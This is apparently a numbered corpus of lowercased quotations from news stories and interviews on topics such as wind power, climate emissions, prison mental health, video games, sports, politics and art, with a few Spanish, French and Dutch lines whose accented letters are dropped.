7542446 605 one of the most dangerous ideas for a philosopher is oddly enough that we think with or in our heads 606 the idea of thinking as a process in the head in a completely enclosed space gives him something occult 607 is thinking a specific organic process of the mind so to speak as it were chewing and digesting in the mind can we replace it by an inorganic process that fulfills the same end as it were a prosthetic apparatus for thinking how should we have to imagine a prosthetic organ of thought
7542447 if one takes the view that human mental activity depends for its full expression upon being linked to a cultural tool kit a set of prosthetic devices so to speak then we are well advised when studying mental activity to take into account the tools employed in that activity
7542448 i want to take you higher baby baby baby light my fire
7542449 the questions a photographer raises may be more profound than the answers the medium permits
7542450 because you know the photographs are more a question than a reply
7542451 a picture can be an answer as well as a question but if you cant answer your question try to question your question there are clever questions and stupid answers as well as stupid questions and clever answers there can be questions without answers but no answers without questions
7542452 the best art makes your head spin with questions perhaps this is the fundamental distinction between pure art and pure design while great art makes you wonder great design makes things clear
7542453 i dont think it is the function of art to be pleasing art is not democratic
7542454 we may distinguish between two types of imaginative process the one starts with the word and arrives at the visual image and the one starts with the visual image and arrives at its verbal expression
7542455 there is something embarrassing in the way in which turning suffering into images harsh and uncompromising though they are wounds the shame we feel in the presence of the victims for these victims are used to create something works of art that are thrown to the consumption of a world which destroyed them the so called artistic representation of the sheer physical pain of people beaten to the ground by rifle butts contains however remotely the power to elicit enjoyment out of it the moral of this art not to forget for a single instant slithers into the abyss of its opposite the aesthetic principle of stylization makes an unthinkable fate appear to have had some meaning it is transfigured something of its horror removed this alone does an injustice to the victims yet no art which tried to evade them could confront the claims of justice
7542456 the test of a first rate intelligence is the ability to hold two opposed ideas in the mind at the same time and still retain the ability to function one should for example be able to see that things are hopeless and yet be determined to make them otherwise
7542457 a photograph is a moral decision taken in one eighth of a second or one sixteenth or one one hundred and twenty eighth snap your fingers a snapshots faster
7542458 the greatest obstacle to transforming the world is that we lack the clarity and imagination to conceive that it could be different
7542459 another world is not only possible she is on her way on a quiet day i can hear her breathing
7542460 a limited imagination defends itself against recognizing the world as a system of connected vessels it also is incapable of moving beyond the familiar
7542461 great numbers however cause particular difficulties for our imagination as if we observe humanity in a way that is not permitted for humans and allowed only to gods in other words they can think in categories of masses a million people more a million less what difference does it make
7542462 politics depends to a great extent on judging what is actual relative to what is possible however we have an inherently weak grasp of what is possible and most societies are not set up so as naturally to improve this or to make us aware of possibilities we may have ignored or taken with insufficient seriousness

7542468 excessive speculation in any commodity under contrasts of sale of such commodities for future deliver causing sudden or unreasonable fluctuations or unwarranted changes in the prices of such commodity is an undue and unnecessary burden on interstate commerce in such commodity

7542481 we began discussing a name change for the utility last year when we made the difficult decision to close our coke manufacturing plant after 98 years of operation
7542482 the new citizens energy group name and logo mark honor our heritage while symbolizing the utilitys new strategic emphasis on helping customers conserve energy to reduce their bills and benefit the environment the new name also reflects the utilitys recent expansion into other energy businesses besides natural gas including our growing steam chilled water and facilities management businesses

7542513 ive had people voice their opposition to me that im ruining the herd immunity that my child would put their child at risk
7542514 someone pointed out to her that it was her choice to do that but that she was putting everyones kids in jeopardy by not having her kids vaccinated
7542515 i tend to avoid the subject a little unless i have some reason to think they might believe the same way
7542516 this is a private health matter and not something people are entitled to know about unless i want to tell them
7542517 from the vaccinating parent perspective its a little infuriating because you dont know who these kids are

7542537 developing countries like ghana should come up with trade policies that regulate the influx of foreign manufactured goods because our farmers face strict competition from cheap imports from developed countries which has limited the expansion of our local industry
7542538 ive never seen biden at one of sally quinns parties

7542540 nobodys perfect ben bradlee barked sally went on to fame as a seriously edgy style writer who was nicknamed salty quinn no one was more deft in getting well known subjects to reveal their foibles who was it
7542541 somehow the spotlight was never very far from ben and sally although they never courted it perhaps by this very casual approach to life and living and the loyalty of friends and family they have remained on most everyones a list they are fun to be around they know where the bodies are buried they have staying power and wicked senses of humor
7542542 they should have taken more responsibility maybe publicly supported us and behind the scenes slapped our wrist

7542560 nigeria produces almost 45 percent of the greenhouse gas emissions in africa from its gas flaring by oil firms in the niger delta while south africa produces as much from industrial pollution
7542561 nigeria emits 20 billion cubic metres of gas flares annually accounting for 13 percent of the global 150 billion cubic metres of gas flares every year and making it second in the world after russia
7542562 the emissions from nigeria and south africa huge as they seem can by no means compare to the emissions from the industrialised countries the countries should do something about them at least for the sake of their immediate communities
7542563 this explains why south africa insists that developed countries should take the lead in emissions reduction before developing nations cut down their own emissions
7542564 it doesnt make sense for nigeria and south africa for instance to reduce their emissions while the industrialised nations who are largely responsible for climate change do not make any efforts to reduce theirs
7542565 the atmosphere is a common space for all and our emissions are infinitesimal compared to those in developed countries
7542566 president mwanawasas health has always been a problem even before he started his presidential mandate
7542567 cholera has been a constant problem in the city we have so far reported over 450 cases
7542568 the recent yamuna floods are a set back and we think the water contamination may increase and add to the cholera situation besides it will be favourable for mosquito breeding
7542569 they need to be careful about their water intake to prevent spread of cholera and other gastroenterological problems the stagnant water would also assist in spread of dengue
7542570 the numbers are really increasing i think we have nearly 65 cases of dengue so far good monsoon flood and the current humid atmosphere are providing fodder for the aedes aegypti mosquito the carrier of dengue

7542622 reafirmar el contrato con los ciudadanos basado en la credibilidad la confianza y la sinceridad

7542629 no puede entrar en un congreso con una calculadora porque esto no son sumas aritm ticas sino que se hacen sumas pol ticas
7542630 no soy una desconocida en la organizaci n ni en la sociedad

7542632 sinton a no es sumisi n sino respeto de las dos instituciones
7542633 si se tiene en cuenta la premura con la que se ha hecho todo
7542634 en referencia al obtenido por los organizadores del valencia street circuit

7542636 m s importante es que se saben d nde est n y c mo solucionarlas por parte de la organizaci n y por parte de la federaci n espa ola

7542639 muy poco de urbano es un circuito ocasional con las medidas de seguridad de un circuito permanente pero que est ubicado en una ciudad

7542705 we wanted the federal government to tell the state to act quickly on it

7542715 its natural for parents to make sacrifices to ensure that their kids get the very best
7542716 but it becomes a problem when these sacrifices are detrimental to ones health what tends to happen is that parents will put themselves last this increases their stress and the likelihood that they will eventually become sick
7542717 the majority of all respondents 83 per cent said that they have gone to work sick or exhausted
7542718 in this case parents did so to avoid having their work pile up and ensure that they would have enough time for their kids but this sometimes leads to serious illness and longer periods of time away from family and work
7542719 parents want to provide their kids with an enriched childhood full of opportunities and experiences but lets remember that school life balance is just as important as work life balance sometimes the basic lessons of life taught at home are just as enriching if not more so
7542720 im not sure we ought to be the primary source of residential mental health services in the state
7542721 its not like they had a straight path to prison
7542722 they didnt have other resources and once youre in the criminal justice system its difficult to get out
7542723 the inmates have thrown urine out there until they have soaked tile right up off the floor
7542724 we just could not get tile to stick to the floor there
7542725 ive been working on my behavior and now theyre going to let me back out into population
7542726 over time because of changes at the state hospital and other places we find were keeping them longer and longer
7542727 you can walk back and forth in your cell two or three hours a day
7542728 all the time youre trying to keep your calm and cool so you can do better things
7542729 they take you over to the clinic and put you in a strip cell where you just get your boxers a mattress and a security blanket
7542730 you can conceivably make their mental illness worse by isolating them too much
7542731 he may have little choice but to go off his medication
7542732 but we almost never get them back to the same level of functioning that they were on that first release
7542733 we struggle with making sure that the men and women who are leaving our facility get a smooth transition and continuity of care particularly medication maintenance once theyre released
7542734 sometimes they take them to jail because they dont know where else to take them
7542735 they will approach consumers of mental health not in an adversarial role but in a way which says they want to help them get the treatment they need
7542736 we need better housing we need more mental health beds you cant solve this by building a bigger jail
7542737 we bring these kids into the courtroom in handcuffs with armed deputies
7542738 uses walking restraints for safety and prevention of elopement when clients are sent to an urgent medical appointment or court hearings that they cant miss early in their admission
7542739 the fabric restraints are only used when a patient is determined to be a flight risk and are removed immediately after a patient has returned safely to the facility
7542740 a board certified psychiatrist with extensive experience in childhood trauma and behavioral management must write an order for the use of restraints
7542741 conducted a thorough investigation of the allegations and ultimately dismissed the complaint
7542742 these kids already have mental health problems i would imagine this would exacerbate them these are not bad children and they have not done anything wrong they are just ill

7542767 de burgemeester alemanno van rome vindt het niet gek dat twee nederlandse toeristen beroofd zijn

7542771 these guys are just the tip of the iceberg let them in and they are going to take the whole thing and then thats the ranges gone to an industrial park
7542772 were not just thinking this is our backyard of the region but what is happening to new zealand we think these guys need to be a bit more thoughtful of ways to generate power
7542773 regardless of which approach we use there will be extensive discussion and dialogue with landowners its great a group has formed and wants to have their views heard too
7542774 we want to give predictability to the private sector and lay clear ground rules for wind project development while being sensitive to neighborhood concerns
7542775 they all say i want to save money on my electricity how do i go about it now that the price of oil has gone berserk everybody and their brother wants one
7542776 we dont have a lot of land and there are a multitude of obstructions so we are most likely to see community scale turbines and building integrated rooftop turbines

7542779 cuando hillary clinton fue claramente en las primarias dem cratas la persona que obtuvo el m ximo n mero de votos 18 millones fue una gran argumentadora y una gran activista

7542788 the experience of denmark is that wind energy is expensive inefficient and not even particularly green
7542789 we believe there is weve been studying this area now for eight months
7542790 wed like to do a monitoring tower in porter county if we can get lease agreements with landowners
7542791 we only want to build projects in communities that want us there
7542792 bullying tactics are commonly used in the wind farm industry
7542793 in our mode of development there will not be a lot of surprises
7542794 im sure there is someone in allegany that can operate a back hoe
7542795 our company is all about utilizing local labor and resources
7542796 i think one of the reasons we are excited is the economic possibility
7542797 if you dont have a transmission system to get it there it becomes useless
7542798 long distance transmission is only economic if it is built to high capacity which means that there must be a large amount of generation capacity in one place
7542799 were going to be the first county in new york state to use methane gas from landfills for energy
7542800 im not sure but what in some parallel universe you might want to of course its your decision but i thought you might want to
7542801 yeah theres three of them way down at the corner
7542802 freddy keep your fuckin voice down nothing really they look like norms can almost make out clothing can barely see them though they are just floating around without really looking in any particular direction
7542803 you think we should chance it fuck i knew we werent going to have enough time to get back before dark there will be heaps more out soon and well be fucked then and
7542804 christ i almost shit on myself did you feel how cold it was as it got closer ive never seen one before did you get a good look at it
7542805 i forgot to breathe the whole time fuck freddy i think i did shit on myself a little bit nah ive never seen one before but there was no mistaking it cant be anything else that looks like that i dont want to ever see one again either
7542806 or hear man those are the creepiest sounds ive ever heard shit im going to have nightmares for weeks now i mean ive been having nightmares since those bastard ghosts started popping up but this is something else they dont even touch the fucking ground how can they make noise like that
7542807 two of the norms have gone but theres one left looks pretty harmless but no point in risking it now that we are almost home how many screamers you got left
7542808 only one i wish i knew why those wraiths go after these things each time
7542809 i dont know why alright ive got two of them you keep yours ill use one of mine you ready ok 5 second timer ill throw on the count of three
7542810 all clear it went after the screamer good thing too because its one of the angry ones seems to be attacking the shit out of it alright lets go
7542811 oh come on you know it us already open the damned door
7542812 im working on an ordinance using benton county as a template with bits and pieces from all over the country
7542813 the benton county ordinance isnt as specific as id like its designed for large facilities id like ours to address smaller commercial facilities like the one near indianapolis thats supplying 60 percent of the power for a warehouse operation
7542814 one of them trade wind from kansas is looking at 1 000 acres in porter county extending into laporte county
7542815 work on the ordinance is still very preliminary we need to work out whether developers would need special exceptions how to keep the towers from being an eyesore and other issues were really interested in keeping porter county green
7542816 im going to be as interested as anyone else ill want to know whats safe how it affects the surrounding properties
7542817 when we came here we wanted to be able to do everything because we were pioneers
7542818 we didnt know whod follow us from other wind turbine producing countries we had to be self reliant
7542819 its a tough thing to have to go through for those being laid off and certainly something that no one wants to happen
7542820 they tried to do too many things all at once
7542821 but in the upcoming years we could have to shift over 1 million per year
7542822 natural consequence of the state setting the recapture level and equity level at a fixed yield
7542823 the yields must rise in concert with the increase in the states wealth
7542824 this will enable a low wealth district to keep up with inflation and increasing standards without raising tax rates
7542825 the perception of almost everyone in the state is that higher property values lead to increases for school districts but that is not the case with the finance system that is in place now
7542826 no school is particularly happy in the current finance system because that target revenue level set by the state means no new money unless the district has an increase in enrollment
7542827 there are not many west texas districts that are experiencing enrollment growth
7542828 les externes ne sont pas tous revenus la m me heure alors quils taient tous au m me cours
7542829 you can predict some changes in the wind broadly but not second by second
7542830 depending on the wind a wind farm will be generating between 15 and 35 percent of its potential relative to what it would be if the wind was available steadily all day
7542831 the denmark story is basically a fable they can do that because the whole danish system is part of the northern european grid
7542832 hemos vuelto a ser una potencia fuerte por lo que exigimos que se nos preste el respeto debido
7542833 they have made everything simple by putting the calibration controls in the receiver and providing separate calibration memory for each input we have worked with integra for the past year to make sure all the coarse grain and fine grain calibration adjustments correspond to isf protocols now isf trained technicians can achieve a perfect match for all the sources and also provide the end user will simple intuitive control over sources and switching
7542834 ill say yes to that idea but not because it is already running or anything
7542835 im just saying yes because its possible i think it is possible sorry to say we dont have specific plans at the moment but it is possible yes
7542836 cuando llegu a venezuela y vi por primera vez una botella de coca cola se me llenaron los ojos de l grimas
7542837 every hardcore gamer in the world will probably be able to get a key if they want to
7542838 were not going to turn on a switch one day and suddenly our audience gets 100 times bigger
7542839 were going to have a very large closed beta almost to the point where every hardcore gamer in the world will probably be able to get a key if they want to it would just be within a closed beta so that we can control the size of it to a degree
7542840 its an interesting difference between a packaged goods product like our previous battlefield games in that there is no real kind of big splash release date where suddenly its available it kind of builds up over time the game will kind of sneak out and before you know it it will be a fairly big game even though were in the closed beta and were not released
7542841 as you know we allowed people to vote on which character they most wanted to see in the console version and cammy won so shes definitely in the game
7542842 we have a rough version of her already up and running akuma came in second or third and weve already included him in the arcade game
7542843 i want you to help me spread the message to ghanaians that no blood should be shed because of the elections

7542845 a community of interest is an online community where the primary value is based on the personal or social interests of its members examples include myspace youtube and flickr
7542846 a community of practice is an online community where the primary value is based on professional interests and is created in the course of members performing their jobs
7542847 the back is just split right wide open so all three of them went out through the back the other two went out through the side
7542848 this shoe here on the side of the road this is from one of the persons that was ejected from the vehicle hes come right across all three lanes and onto the shoulder
7542849 to wall run in the previous prince of persia you would just hold down a button when near a wall and he would do it
7542850 in this game the acrobatics are very jump centric you actually have to jump at a wall and then it detects what angle youre hitting it at and hell run when he hits it
7542851 its a similar thing with the roof run when you come in contact with the ceiling you jump you do the run and then you have to hit the glove button to grab any element on the roof in order to keep going so theres a rhythm to it
7542852 with this new move our level designers had all the tools they needed to create acrobatic sequences that can use pretty much every surface in the game
7542853 even in the original one he had a british accent right he wasnt very persian either its just one of those things
7542854 the character doesnt even necessarily look persian but the persian part is not so much him as much as just the spirit of the world

7542857 we need to think about it but i wouldnt want to spoil the story
7542858 weve spent a lot of time working on the story this time weve worked with people from hollywood script writers to really make it just right and i think its a very unusual story for a videogame so i think people will be quite surprised
7542859 this is something its really too early to talk about but its definitely a possibility
7542860 theres so many possibilities with this thing because what matters now is just the story you want to tell do you have a good story to tell then you can do it because this thing isnt specific to the series you can tell any story with this interface because its entirely contextual
7542861 customer appreciation day is really an event for ourselves and our partners at the morale welfare recreation office and along with our vendors to show support for our customers and what they do in a day in day out basis both in terms of what they bring to us in terms of business but also what they do for our country by serving
7542862 a stubborn bullheaded dive in head first kind of woman
7542863 there is a danger this move could increase the carbon emissions of the public sector overall and damage the economic viability of our growing renewable energy sector
7542864 the scottish government needs to show it is serious about reaching its targets on reducing carbon emissions so far all we have had from them on reducing emissions is hot air
7542865 the government needs to use the public purse as a powerful tool to help catalyse the switch to a low carbon economy which in the long run will deliver cheaper and more secure energy
7542866 changing away from the current 100 deal is clearly giving a confusing signal to the public
7542867 buying 100 green electricity does not decrease emissions and does not increase the production of renewable electricity
7542868 market conditions led by our renewables legislation mean that the demand for green electricity remains significantly ahead of supply paying the green premium is likely to be more expensive and could even push prices up
7542869 we want to boost the amount of energy coming from renewables
7542870 it is completely wrong to suggest that our approach to buying electricity will harm that ambition

7542872 la meditaci n trascendental puede terminar con la violencia de r o

7542874 si experimentas este nivel m s profundo la conciencia comienza a expandirse con pr ctica todas las personas pueden hacerlo
7542875 hay una idea muy rom ntica en la que el artista tiene que sufrir tiene que pasar hambre o estar deprimido para expresar algo
7542876 si el artista est sufriendo realmente no podr a hacer su trabajo si uno tiene hambre no tiene ganas de hacer nada m s cuanta menos negatividad mayor es el flujo de creatividad y esa es la raz n por la que he estado practicando meditaci n trascendental todos estos a os

7542895 announcement will not impact on scotlands clear competitive advantage in developing clean green energy sources such as wind wave and tidal power
7542896 this makes it virtually certain that the 2011 target will be met early it is another step towards making scotland the green energy capital of europe
7542897 salmond wants scotland to have an export oriented renewable energy industry and i think thats a great vision
7542898 this is a unique time as were starting out in the renewable energy industry
7542899 the only mature technology is wind but we need a mixture of conventional and green technologies including marine
7542900 theres no reason why that same vision and model cant be applied in scotland
7542901 there is no real mature marine renewable industry anywhere in the world yet and scotland has the opportunity to take that leadership position
7542902 im not a huge fan of trying to punish your consumer
7542903 albeit these people have clearly stolen intellectual property i think there are better ways of resolving this within our power as developers and publishers
7542904 we absolutely should crack down on piracy people put a lot of blood sweat and tears into their content and deserve to get paid for it its absolutely wrong it is stealing
7542905 but at the same time i think there are better solutions than chasing people for money im not sure what they are other than to build game experiences that make it more difficult for there to be any value in pirating games
7542906 if we learned anything from the music business they just dont win any friends by suing their consumers
7542907 speaking personally i think our industry does not want to fall foul of what happened with music
7542908 not as far as im aware regarding what ea needs to do i cant comment on that ea takes piracy very seriously and people deserve to get paid for content they create
7542909 but as far as im aware we have no plans that i know of to partner with atari and codemasters and chase down consumers

7542914 the president was entirely unaware of the nature of the play before it was presented and at no time has expressed his approbation of it
7542915 the klans resurgence in the 1920s partially stemmed from the extreme militant wing of the temperance movement in arkansas as elsewhere the newly formed ku klux klan marked bootleggers as one of the groups that needed to be purged from a morally upright community in 1922 200 klansmen torched saloons that had sprung up in union county in the wake of the oil discovery boom the national klan office ended up in dallas texas but little rock was the home of the women of the ku klux klan the first head of this female auxiliary was a former president of the arkansas wctu
7542916 support for prohibition represented the single most important bond between klansmen throughout the nation
7542917 by mid 1949 there were so many charred house carcasses that the area college hills was informally named dynamite hill

7542993 the first product to be released to market using this platform will be the iq 577 tm which will deliver 577 nm yellow light from a solid state laser in either conventional continuous wave cw or micropulse mode the iq 577 provides a wavelength and technology that complements our product portfolio and is not commercially available from any of our competitors 577 nm is of interest because it is at the peak of the oxyhemoglobin absorption curve and was a popular wavelength when argon dye laser systems were widely distributed however due to complexity and poor reliability those products are now obsolete we believe that a reliable solid state 577 nm laser system has the opportunity to fill this void
7542994 i think the area where we spent the most attention was how to actually write the health care plank because clinton had proposed that it be an actual mandate to purchase health care and obama had not were all in agreement that there needs to be healthcare coverage for every man woman and child in the united states

7543005 after confirming the first minefield and marking it we received tips from supporting units about a possible secondary minefield to the north
7543006 locating marking and breaching enemy minefields are a staple of the combat engineer field albeit one that we rarely are called upon for
7543007 this is unlike a route clearance mission where we use visual and mechanical detection methods to locate improvised explosive devises along a route to ensure safer passage by coalition forces
7543008 for this last mission we marked the friendly side of two different minefields and neutralized six mines located in iraq
7543009 all were trying to do is keep our people safe
7543010 the fact that barack obama named joe biden as his vice presidential candidate will have relatively little impact on the strategic framework of the race biden was the best of the names on obamas short list his experience in foreign affairs his tough advocacy of the democratic agenda and his skill at handling himself will all help obamas campaign but not decisively the other options were worse tim kaine governor of virginia had as little experience as obama evan bayh senator from indiana is way too soft spoken and mild for a rough and tumble campaign but the most important thing is that obama did not choose a woman he needed one with hillarys evident availability for the nomination his failure to name her or some other woman stands out starkly to women voters it doesnt matter to them that he chose biden over bayh or kaine what matters is that he did not choose hillary or another woman

7543033 one of the most challenging economic and policy environments in memory
7543034 although we have seen improved functioning in some markets the financial storm that reached gale force some weeks before our last meeting here in jackson hole has not yet subsided
7543035 its effects on the broader economy are becoming apparent in the form of softening economic activity and rising unemployment
7543036 the commentary tells me that rates are on hold until they see some blue skies through this financial storm
7543037 inflation is not out of control but its clearly drifting away
7543038 with financial conditions already quite fragile the sudden unanticipated failure of bear stearns would have led to a sharp unwinding of positions in those markets that could have severely shaken the confidence of market participants

7543159 american basketball where its supposed to be on the top of the world
7543160 the fact that we had this team for three years was the telling difference in this game
7543161 it was a great game it was a pressure game from the get go and we never cracked the fact that we were together for this period of time was the difference
7543162 everybody wants to talk about n b a players being selfish and arrogant and being individuals
7543163 well what you saw today was a team bonded together facing adversity and coming out of here with a big win
7543164 i think its important to play for the national team now
7543165 i think thats what jerry wanted to do that was the whole goal
7543166 it was one of the great games of all time in olympic history the quality and caliber of player in this championship game was extraordinary the bar has been raised and its going to be even better next time around
7543167 if the giants make a sincere overture its a good chance that strahan would consider coming back
7543168 there are other things he has to take into consideration the money and his contract with fox

7543170 would i like michael to be a new york giant this season absolutely absolutely
7543171 will he be i have no idea i dont even want to put a percentage on it but things changed very quickly saturday night and if one of the potential solutions is to reach out to michael worst case its certainly worth a phone call

7543173 thats what ive been used to doing all my life
7543174 you cant be selfish in here everyone has to play for the same goal if they need me to help out and go play receiver i will do it
7543175 i want to go out and be one of the leaders on the team and make plays and make things happen
7543176 thats what they pay us to do when the ball comes my way make sure i dont drop it and make something happen when i get it

7543200 too many software projects rely on only one or a very few team members who know how to build and assemble the final released product

7543211 i would just recommend to any other office manager that its best to think these sorts of things through before just diving into them the stapling event got a little out of hand
7543212 thats on me bad management the rules should have clearly stated that only manual staples would work and not those huge ones either just the regular kind so i left a loophole and they took advantage of it fine that wont happen again in 2012

7543222 parliament remains the correct place for debate and decision on such treaties
7543223 it is high time for me to put an end to your sitting in this place which you have dishonored by your contempt of all virtue and defiled by your practice of every vice ye are a factious crew and enemies to all good government ye are a pack of mercenary wretches and would like esau sell your country for a mess of pottage and like judas betray your god for a few pieces of money
7543224 is there a single virtue now remaining amongst you is there one vice you do not possess ye have no more religion than my horse gold is your god which of you have not barterd your conscience for bribes is there a man amongst you that has the least care for the good of the commonwealth
7543225 ye sordid prostitutes have you not defild this sacred place and turnd the lords temple into a den of thieves by your immoral principles and wicked practices

7543227 the best british political libertarian blog on the web consistently excellent but not for the squeamish
7543228 but for all that he is a brilliant writer incisive fisker extraordinaire and with an over developed sense of humour and he can back up his sometimes extraordinary views with some good old fashioned intellectual rigour im promoting him on my blogroll to a daily read
7543229 the glorious devils kitchen not for the squeamish or easily offended
7543230 a very smart article takes a pretty firm libertarian line on the matter
7543231 by the way dk seems to be on fucking good form at the moment
7543232 devils kitchen is the big name on the free market libertarian strand of the british blogosphere profane rants are the immediate stand out feature of dks blog but the ranting is backed up by some formidable argument on a wide range of issues particularly relating to british and european parliamentary politics economics and civil liberties
7543233 an excellent intelligent uk political blog which includes a great deal of swearing
7543234 i like the devils kitchen i think its one of the best written and funniest blogs in the business
7543235 for sheer intelligence erudition and fun iain dales diary cranmer and devils kitchen are so far ahead of the rest i dont see how they can figure in a top ten they are the beatles stones and who of the blog world the astair bogart and marlon brando of the blog world the gerswin porter and novello of the blog world the dot cotton pat butcher bette lynch of the blog world
7543236 its the blogging equivalent of someone eating ostrich vindaloo washed down by ten bottles of jamaican hot pepper sauce and then proceeding to breathe very close to your face while talking about how lovely our politicians are but theres much more to his writing than four letter words
7543237 the devils kitchen is a life affirming life enhancing blog this particular post will also lead you to some of the best soldiers in the army of swearbloggers of which he is field marshal
7543238 underneath all the ranting and swearing dk s a very intelligent and thoughtful writer whom many people take seriously despite disagreeing with much of what he says
7543239 the most foul mouthed of bloggers devils kitchen was always likely to provoke sometimes disgust but more often admiration
7543240 i dont mean it literally or even metaphorically i just find that his atheism aside i agree with everything the devil of kitchen fame says i particularly enjoy his well crafted and sharp swearing especially when addressed at self righteous lefties
7543241 spot on accurate and delightful in its simplicity devils kitchen is one of the reasons that were not ready to write off euroweenie land just yet at least not until we get done evacuating the ones with brains
7543242 this hugely entertaining articulate witty scottish commentator is also one of the most foul mouthed bloggers around gird up your loins and have a look essential reading
7543243 the devils kitchen is one of the foremost blogs in the uk the dk is bawdy foul mouthed tasteless vulgar offensive and frequently goes beyond all boundaries of taste and decency so why on earth does dr crippen read the dk because he reduces me to a state of quivering helpless laughter
7543244 dk is a take no prisoners sort of libertarian his blog is renowned for its propensity for foul mouthed invective which can be both amusing and tiresome by turns nevertheless he is usually lucid often scintillating and sometimes illuminating
7543245 if you enjoy a superior anti left rant albeit one with a heavy dash of cursing you could do worse than visit the devils kitchen the devil is an astute observer of the evils of nulabour thats for sure i for one stand converted to the devil and all his works
7543246 this fellow is sharp as a tack funny as hell and when something pisses him off meaner than a badger with a case of the bullhead clap
7543247 foul mouthed eloquence of the highest standard in bad taste offensive immoderate and slanderous f ing brilliant
7543248 i tend to enjoy devils kitchen not only because i disagree with him quite a lot of the time but because i actually have to use my brain to articulate why
7543249 this blog is currently slamming politics certainly aint all my own but style and prose is tight fierce provocative and funny ok i am a child swear words still crack a laugh
7543250 10 000 words per hour blogging output prolific or obsessive compulsive i have yet to decide
7543251 anyone can cuss but to curse in an imaginative fashion takes work
7543252 ive been laffing fit to burst at the unashamed sweariness of the devils kitchen certainly my favourite place recently
7543253 god bless the devils kitchen colourful as his invective is i cannot fault his accuracy
7543254 it made me laugh out loud and laugh so hard and i dont even get all the references i hope his politics dont offend you but he is very funny
7543255 dk himself is unashamedly right wing vitriolic and foul mouthed liberally scattering his posts with four letter words not to be read if youre easily offended but highly entertaining and very much tongue in cheek
7543256 this blog is absolutely wasted here and should be on the front page of one of the broadsheets
7543257 this labour government is the most mendacious dishonest endemically corrupt power hungry incompetent illiberal fucking shower of shits that has ruled this country

7543503 voters are divided over whether mccain would continue bushs policies thats one reason why mccain is competitive imagine what this election would look like if george w bush were running for re election or vice president dick cheney were running to succeed him
7543504 the republican party and mccain are being by helped by the recent crisis between the republic of georgia and russia anything that heightens concern over national security is likely to be good for mccain

7543512 up until recently it just hadnt really occurred to us to put vocals into a song every thing just seemed you can kind of tell when things are complete we tend to start our songs with one idea a small little thing a beat or a melody or something and just kind of pass ideas around well add to it and change it and at some point you just kind of get the impression that something is done and then it goes into the finished pile and until then any instrument or technique is fair game
7543513 as close as we get to writing lyrics most of the time is coming up with a couple of words that match the sound of the song
7543514 that one actually came from a picture book that we were looking at in the studio while we were working on the record there was an illustration of a kid on a sled shoving another kid into a sculpture of a horse made of snow so its pretty literal in that one

7543560 people are talking to me but some of the people i know went through much more than i did t here are 3 000 children missing in new orleans the national center for missing and exploited children places the figure at 1 300 hundreds of bodies are waiting to be identified the people of new orleans have been scattered to the four winds their lives were determined by people in washington and baton rouge before the storm hit without african americans having ownership economic equity and the same type of things the french quarter gets like tax cuts the city will never be the same the 6th 7th 8th and 9th wards should have their own tourist commission build our own hotels and restaurants in those areas the key is ownership then i would think about going back and living there but were still practicing american democracy how can we ever bring it to somebody else
7543561 would i go back to live theres nothing there the situation for musicians was a joke people thought there was a new orleans music scene there wasnt the only musicians i knew who made a living playing music in new orleans were kermit ruffins and pete fountain everyone else had to have a day job or go on tour i have worked more in two months in austin than i worked in two years in new orleans a lot of things about life in new orleans were a myth

7543584 i was basically on the internet for 14 hours a day looking for resources i wanted facts and i wanted reality i started looking and couldnt find anything and i realized that what i needed was another widow to come to my house
7543585 the first was a widow who was in my husbands unit
7543586 i was hoping i would learn a little about what my life would be like without michael i really just wanted to know that i wasnt alone
7543587 what was really cool was seeing all these women coming together to talk about their husbands
7543588 contrary to what most un widowed people think the second year can often be more difficult than the first
7543589 and i never thought that id be able to laugh again as hard as i have with these widows

7543616 we therefore feel that these repeated defaults and violations have forced us to withdraw our support from the ruling coalition and sit on the opposition benches
7543617 it is extremely rare for two incidents of this nature to occur just over a mile apart in an area such as workington and we are devoting significant resources to catching those responsible we are reminding women to be mindful of their personal safety when out in the town

7543625 the last ge saw singaporeans who were newly residents overseas travelling long distances to the nearest singapore embassy only to be disappointed that they could not cast their votes because they did not register during the 21 day window
7543626 we will now allow overseas voters to register themselves any time before the writ of election is issued once the writ is issued registration will cease once the election is over overseas singaporeans can apply to register as an overseas voter for the next general election
7543627 its not compulsory you dont have to do it in fact there are some parties that dont even have enough polling agents for the singapore election so we dont see the need to spend public money to send opposition or pap polling agents to an overseas city
7543628 we should trust the integrity of the election process and that so far there have been no complaints people know that our election is fair and transparent and that is not an issue at all to have polling agents overseas
7543629 panel data for 1992 2006 exclusive of time factors which strikingly suggest that the average talent level of small firm ceos is only slightly lower than that of large firm ceos but the talent variability of small firm ceos is far greater than that of large firms
7543630 each firm would like to hire an agent who would produce an expected profit to the firm at least as great as the other agent would however each firms decision can also affect be affected by the other firms decision

7543632 when a large firm hires a low ability manager the expected pay for the low ability manager can be higher than that for a high ability manager who is hired by a small firm if the large firms productivity and the firm size are sufficiently higher and larger than those of the small firm
7543633 that a manager who previously worked for a large firm will be given a contract with a higher sensitivity than a manager who previously worked for a small firm we find significant statistical support for this hypothesis

7543668 i swear to allah that i do not know them they were strangers
7543669 one of the womens names was maybe fadhila and the other was called widad

7543671 i did not disconnect it because maybe it fell off me
7543672 its an area known for avalanches it the ice regularly breaks off here
7543673 they were in the trail but the problem was that the avalanche swept away the trail
7543674 the guide shouted run fast run fast it didnt make any noise it really was impressive
7543675 we had just enough time to move away to the right before getting hit we were really lucky
7543676 from the moment we could locate them with radar echo and surface analyses it was already five hours after the avalanche so theres no more hope
7543677 we are in for a long battle as the floods have come in areas which are not prone to it
7543678 we used to have this thing about stress being bad but what we call eustress literally meaning good stress has positive benefits it comes from doing things like exercise sex or meeting a challenge physically it improves your respiration lowers blood pressure and heart rate and your levels of endorphins hormones which make you feel good are raised
7543679 it can be really beneficial as a way of getting out of that black hole
7543680 roxies way of coping is to go out and surround herself with friends sams is to stay at home
7543681 everyone says how terrible it must be for roxie losing her twin but its just as hard for sam who was also very close to jodie
7543682 at sport and riding she always showed determination and a lack of fear
7543683 she applied those same qualities to coping with her illness she never complained never said why me nor did she show any jealousy of roxie being able to have a normal life michelle and rob had no idea jodies would die so soon after the above picture was taken having an identical twin it was in her face the whole time that roxie had everything but she was only bad tempered a few times when the chemo made her feel awful
7543684 so i took her to the doctor who referred her for an mri scan
7543685 it was wonderful that rob rox and sam were able to visit clic allowed us to stay together
7543686 in the easter holidays jo began getting terrible back pain a scan revealed that the cancer had returned grown and contaminated some lymph nodes on april 29 we were told that she could have more chemotherapy to prolong her life but the cancer was terminal we chose not to tell jo because we didnt want to take away all hope

7543987 outgrowing homegrown is your in house billing system hampering your growth
